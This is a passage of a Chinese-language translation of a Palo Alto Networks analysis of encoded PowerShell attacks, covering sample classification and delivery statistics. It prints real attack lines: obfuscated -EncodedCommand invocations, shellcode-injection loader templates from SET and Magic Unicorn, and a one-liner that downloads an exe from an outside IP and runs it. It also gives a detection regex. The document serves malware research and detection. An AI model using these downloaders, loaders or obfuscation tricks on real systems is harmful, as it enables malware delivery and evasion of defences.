<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】揭开PowerShell编码攻击的神秘面纱 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="powershell,powershell编码攻击"/>
    
        <meta name="description" content="在过去的几年中，随着框架不断完善成熟，PowerShell也在不断获得人们的关注和欢迎，因此，在攻击行动中越来越多地看到PowerShell的身影也就不足为奇了。本文主要向大家介绍了PowerShell编码攻击相关的内容。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】揭开PowerShell编码攻击的神秘面纱</h2>
                <div class="article-msg">
                    <span class="time">2017-03-21 11:27:56</span>
                    
                                        <span class="read">阅读：16633次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3630"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3630" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
                             target="_blank">来源： paloaltonetworks.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2819002922" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0104d1b8b4ca36e961.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2819002922" style="color:#848e99;">興趣使然的小胃</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p3.qhimg.com/t015a96a5bc1cd6d5d7.png" title="t015a96a5bc1cd6d5d7.png" alt="http://p3.qhimg.com/t015a96a5bc1cd6d5d7.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2819002922" target="_blank" textvalue="興趣使然的小胃" style="text-decoration: none;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192); font-weight: 900;">興趣使然的小胃</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">稿费：200RMB（不服你也来投稿啊！）</span></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192); font-size: 18px;"><span style="font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">一、前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在过去的几年中，随着框架不断完善成熟，PowerShell也在不断获得人们的关注和欢迎，因此，在攻击行动中越来越多地看到PowerShell的身影也就不足为奇了。PowerShell为攻击者提供了系统各种原生功能支持，通过快速查看PowerShell恶意工具的泛滥形势，你可以对此类工具的增长态势有个整体了解。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">微软对高版本的PowerShell做了些处理，提供了包括Transciption、ScriptBlock等多种方式来记录PowerShell的活动日志，因此基于PowerShell的攻击需要在运行时对其代码进行混淆编码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先让我们来看一下PowerShell的“-EncodedCommand”参数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">-EncodedCommand
&nbsp;&nbsp;&nbsp;&nbsp;Accepts&nbsp;a&nbsp;base64-encoded&nbsp;string&nbsp;version&nbsp;of&nbsp;a&nbsp;command.&nbsp;Use&nbsp;this&nbsp;parameter
&nbsp;&nbsp;&nbsp;&nbsp;to&nbsp;submit&nbsp;commands&nbsp;to&nbsp;Windows&nbsp;PowerShell&nbsp;that&nbsp;require&nbsp;complex&nbsp;quotation
&nbsp;&nbsp;&nbsp;&nbsp;marks&nbsp;or&nbsp;curly&nbsp;braces.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如PowerShell上述的使用说明，“EncodedCommand”是其一个命令，旨在对复杂字符串进行封装以便PowerShell在命令行中进行执行。你可以利用此命令对关键字符串进行隐藏，以躲避防护软件的探测。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">本文主要有两个目的，其一，本文在“整体分析”中会分析利用Palo Alto Networks AutoFocus服务识别收集的4,100个PowerShell攻击样本（这些样本均使用了EncodedCommand技术），来了解PowerShell攻击中所使用的技术及攻击方式；其二，我将利用解码后样本对PowerShell代码进行分类，为后续识别或研究工作提供参考。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">二、整体分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在开始分析前，我首先需要识别使用该技术的样本。因为PowerShell为用户提供了多种灵活调用参数的方法，因此样本的识别工作并不像想象中的那么容易。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以下三个样本使用那个了三种不同的方法来调用EncodedCommand参数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1、完全形式：</span></p><pre class="brush:plain;toolbar:false">powershell.exe&nbsp;–EncodedCommand&nbsp;ZQBjAGgAbwAgACIARABvAHIAbwB0AGgAeQAiAA==</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">2、大写截断形式：</span></p><pre class="brush:plain;toolbar:false">powershell.exe&nbsp;–eNco&nbsp;ZQBjAGgAbwAgACIAVwBpAHoAYQByAGQAIgA=</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">3、转义字符注入分解字符串形式：</span></p><pre class="brush:plain;toolbar:false">powershell.exe&nbsp;–^e^C^&nbsp;ZQBjAGgAbwAgACIAVwBpAHQAYwBoACIA</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对这三种方法进行组合利用，单论“EncodedCommand”参数，我们就可以得到100,00多种变化。我给出了以下的正则表达式，覆盖了这种变化多数情况，同时也可以方便地应用于动态分析报告中的大规模语料库场景。</span></p><pre class="brush:plain;toolbar:false">\-[Ee^]{1,2}[NnCcOoDdEeMmAa^]+&nbsp;[A-Za-z0-9+/=]{5,}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">比如，正则表达式可以提取如下的PowerShell命令以便后续分析：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">powerShell.exe&nbsp;-WindowStyle&nbsp;hiddeN&nbsp;-ExecuTionPolicy&nbsp;ByPasS&nbsp;-enc&nbsp;
cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6
AC8ALwAxADkAMgAuADEANgA4AC4ANAA4AC4AMQAyADkALwB0AGUAcwB0AC4
AagBwAGcAIABzAGMAcgBvAGIAagAuAGQAbABsAAoA</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">大多数编码数据都是利用模板或公开工具生成而来，每当攻击者需要运行shellcode或下载另一个恶意文件时，他们并不需要重复造轮子。这一点可以通过以下情况证实：攻击代码中的底层代码基本一致，只有其中的文件下载地址及其他信息存在略微不同。为了对数据进行分析，我需要尝试识别代码并确定代码的生成方式，或者至少能够对代码进行分组归类。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.1 分析方法</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">为了说明这个工作的困难程度，我们可以回看2012年Matthew Graeber发布的一篇关于PowerShell脚本的博文，脚本可以加载shellcode至内存并运行。这个脚本也是此类技术的基础模板，大多数公开工具参考了脚本以期获得同样功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以下是TrustedSec系列工具中的社会工程学工具集（Social-Engineer Toolkit，SET）和Magic Unicorn工具经过两次迭代后的表现形式。对比两个样本，你可以发现，初始变量名上SET使用的是“$c”，而Magic Unicorn使用的是“$nLR”。与此类似，SET中“$size”与Magic Unicorn中“$g”对应，“$sc”与“$z”对应，“$x”与“$kuss”对应。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SET：</span></p><pre class="brush:plain;toolbar:false">$c&nbsp;=&nbsp;&#39;[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;VirtualAlloc(IntPtr&nbsp;lpAddress,&nbsp;uint&nbsp;dwSize,&nbsp;uint&nbsp;flAllocationType,&nbsp;uint&nbsp;flProtect);[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;CreateThread(IntPtr&nbsp;lpThreadAttributes,&nbsp;uint&nbsp;dwStackSize,&nbsp;IntPtr&nbsp;lpStartAddress,&nbsp;IntPtr&nbsp;lpParameter,&nbsp;uint&nbsp;dwCreationFlags,&nbsp;IntPtr&nbsp;lpThreadId);[DllImport(&quot;msvcrt.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;memset(IntPtr&nbsp;dest,&nbsp;uint&nbsp;src,&nbsp;uint&nbsp;count);&#39;;$w&nbsp;=&nbsp;Add-Type&nbsp;-memberDefinition&nbsp;$c&nbsp;-Name&nbsp;&quot;Win32&quot;&nbsp;-namespace&nbsp;Win32Functions&nbsp;-passthru;[Byte[]];[Byte[]]$sc&nbsp;=&nbsp;;$size&nbsp;=&nbsp;0x1000;if&nbsp;($sc.Length&nbsp;-gt&nbsp;0x1000){$size&nbsp;=&nbsp;$sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for&nbsp;($i=0;$i&nbsp;-le&nbsp;($sc.Length-1);$i++)&nbsp;{$w::memset([IntPtr]($x.ToInt32()+$i),&nbsp;$sc[$i],&nbsp;1)};$w::CreateThread(0,0,$x,0,0,0);for&nbsp;(;;){Start-sleep&nbsp;60};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">Magic Unicorn：</span></p><pre class="brush:plain;toolbar:false">$nLR&nbsp;=&nbsp;&#39;[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;VirtualAlloc(IntPtr&nbsp;lpAddress,&nbsp;uint&nbsp;dwSize,&nbsp;uint&nbsp;flAllocationType,&nbsp;uint&nbsp;flProtect);[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;CreateThread(IntPtr&nbsp;lpThreadAttributes,&nbsp;uint&nbsp;dwStackSize,&nbsp;IntPtr&nbsp;lpStartAddress,&nbsp;IntPtr&nbsp;lpParameter,&nbsp;uint&nbsp;dwCreationFlags,&nbsp;IntPtr&nbsp;lpThreadId);[DllImport(&quot;msvcrt.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;memset(IntPtr&nbsp;dest,&nbsp;uint&nbsp;src,&nbsp;uint&nbsp;count);&#39;;$w&nbsp;=&nbsp;Add-Type&nbsp;-memberDefinition&nbsp;$nLR&nbsp;-Name&nbsp;&quot;Win32&quot;&nbsp;-namespace&nbsp;Win32Functions&nbsp;-passthru;[Byte[]];[Byte[]]$z&nbsp;=&nbsp;;$g&nbsp;=&nbsp;0x1000;if&nbsp;($z.Length&nbsp;-gt&nbsp;0x1000){$g&nbsp;=&nbsp;$z.Length};$kuss=$w::VirtualAlloc(0,0x1000,$g,0x40);for&nbsp;($i=0;$i&nbsp;-le&nbsp;($z.Length-1);$i++)&nbsp;{$w::memset([IntPtr]($kuss.ToInt32()+$i),&nbsp;$z[$i],&nbsp;1)};$w::CreateThread(0,0,$kuss,0,0,0);for&nbsp;(;;){Start-sleep&nbsp;60};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在Magic Unicorn中，生成脚本中有一行用于对一些变量进行随机化处理。以下样例显示了随机化处理的工作机制：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">var1&nbsp;=&nbsp;generate_random_string(3,&nbsp;4)
var2&nbsp;=&nbsp;generate_random_string(3,&nbsp;4)
powershell_code&nbsp;=&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r&quot;&quot;&quot;$1&nbsp;=&nbsp;&#39;$c&nbsp;=&nbsp;&#39;&#39;[DllImport(&quot;kernel32.dll&quot;)]public&nbsp;static&nbsp;extern&nbsp;IntPtr&nbsp;…
powershell_code&nbsp;=&nbsp;powershell_code.replace(&quot;$1&quot;,&nbsp;&quot;$&quot;&nbsp;+&nbsp;var1).replace(&quot;$c&quot;,&nbsp;&quot;$&quot;&nbsp;+&nbsp;var2).replace(&quot;$2&quot;,&nbsp;&quot;$&quot;&nbsp;+&nbsp;var3)&nbsp;…</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">脚本使用3到4个随机数字字符对一些变量进行处理，但不是所有的变量都会被替换，因此我可以得知其变量生成机制。此外，如果没有经过Magic Unicorn脚本或其他形式的随机化处理，当这个特定片段被复制到其他工具中时我也可以鉴别出来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对代码进行分析时，如果代码经过了许多人多年的重度重复使用，那么你总会碰到不适合分析的代码。我试图通过特征值尽可能准确地对代码进行分类，但不一定能做到足够准确，因为没有什么能够阻止别人简单地将代码复制粘贴到自己的工具中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">总体而言，我分析了27类公开工具或技术，它们具有独特的标识符，可以作为归类依据。在编号归类后我会对每个变种进行深度分析。首先我们来看一下变种的分支细目、样本数以及所占的样本百分比，如下表所示：</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0104b4db3d982ba129.png" title="t013e59427b5a46942a.png" alt="http://p0.qhimg.com/t013e59427b5a46942a.png"/></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0173860fcd403cd8cf.png" title="t01ebf91989f8f07084.png" alt="http://p7.qhimg.com/t01ebf91989f8f07084.png"/></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01e91f718f161cb13a.png" title="t012ef66f90195aa7b0.png" alt="http://p6.qhimg.com/t012ef66f90195aa7b0.png"/></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01586890c32d705af3.png" title="t01df7b6c9587d758f6.png" alt="http://p1.qhimg.com/t01df7b6c9587d758f6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们所分析的样本中，超过一半使用了“DownloadFile-StartProcess”技术或前文所述的shellcode注入技术。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.2 整体分布及统计</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们在4,100个样本中发现了4中文件格式。如下表所示：</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t017478d3a910bda090.png" title="t018c80f6c3bab9a29a.png" alt="http://p1.qhimg.com/t018c80f6c3bab9a29a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可知，EXE和DOC格式占了绝大部分。进一步后我们发现，77%的DOC文件（即1,326个样例）可以归到“Downloader DFSP”变种，该变种通过DownloadFile-StartProcess方法实现下载器功能，如以下代码所示：</span></p><pre class="brush:plain;toolbar:false">(New-Object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://94.102.53.238/~yahoo/csrsv.exe&#39;,&quot;$env:APPDATA\csrsv.exe&quot;);Start-Process&nbsp;(&quot;$env:APPDATA\csrsv.exe&quot;)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">有1,159个DOC文件样本（占比87%）可以归到Cerber勒索软件变种中，这意味着存在一款生成恶意Word文档的模板工具，可以用来创建带有启动PowerShell功能的恶意宏文档。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">投递DOC文档的主要渠道是使用SMTP/POP3协议，这与现今勒索软件使用电子邮件进行恶意Word文档投递的情况一致。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t0163d052d2e93b3967.png" title="t01f1da1add084bf8bb.png" alt="http://p7.qhimg.com/t01f1da1add084bf8bb.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图1. 投递恶意PowerShell文档的渠道</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图2描述了攻击目标的行业分布，其中高等教育、高科技、专业领域、律政行业及医疗保健方面的分布所差无几。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t010fff8b5f8361fea4.png" title="t01cd5c20967d06a98d.png" alt="http://p9.qhimg.com/t01cd5c20967d06a98d.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图2. 检测到恶意PowerShell文档的行业分布</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01ee70b479677f4fbe.png" title="t011ad52d4b5283d308.png" alt="http://p2.qhimg.com/t011ad52d4b5283d308.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图3. AutoFocus在过去12个月捕获的恶意Powershell文档样本数。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来让我们看一下EXE样本。在分类方面，这些样本基本都是恶意软件家族的变种，没有特别的地方。有趣的是，它们的攻击目标似乎倾向于高科技行业。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t015202477bbec4540e.png" title="t01f3a4cd890d12de2e.png" alt="http://p1.qhimg.com/t01f3a4cd890d12de2e.png"/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">图4. 检测到恶意PowerShell可执行文件的行业分布</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">与DOC类别样本相比，其在时间上的分布更为均匀。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01a362ae703c9d3439.png" title="t011f4c2cda9a46f9d1.png" 